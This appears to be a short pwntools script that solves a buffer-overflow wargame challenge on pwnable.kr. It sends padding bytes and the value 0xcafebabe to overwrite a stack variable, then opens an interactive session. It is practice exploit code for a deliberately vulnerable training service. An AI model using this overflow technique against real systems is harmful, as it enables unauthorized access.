#!/usr/bin/python3
from pwn import *

p = remote('pwnable.kr', 9000)

payload = 0x2c * b'a'
payload += 0x8 * b'a'
payload += pack(0xcafebabe, 32)

p.sendline(payload)
p.interactive()